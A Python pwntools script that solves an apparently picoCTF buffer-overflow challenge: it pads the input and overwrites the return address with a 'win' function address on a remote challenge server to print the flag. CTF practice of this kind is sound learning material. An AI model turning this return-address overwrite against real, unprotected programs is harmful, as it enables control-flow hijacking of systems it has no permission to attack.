# Solution
# The vuln elf given does not have pie
# Looking at the source code it seems that we will return to a value that we control


'''
Checksec
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
'''

from pwn import *
import re

HOST = 'saturn.picoctf.net'
PORT = 65427

def main():
  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
  proc = remote(HOST, PORT)
  #proc = process('./vuln')
  #gdb.attach(proc)
  #sleep(5)

  buff = b'A' * 32
  rand = b'A' * 4
  ebp = b'A' * 4

  a_win = p32(0x80491f6)

  payload = b''.join([
    buff,
    rand,
    rand,
    ebp,
    a_win
  ])

  proc.sendlineafter(b'Please enter your string: ', payload)
  #log.info(proc.recvline_contains(b'pico'))

  proc.recvline()
  flag = proc.recv().decode('utf-8') # for some reason this needed to be recv and not recvline??? guessing since \n isnt sent after the flag?
  print(flag)

  #print(proc.recvline())

if __name__ == '__main__':
  main()
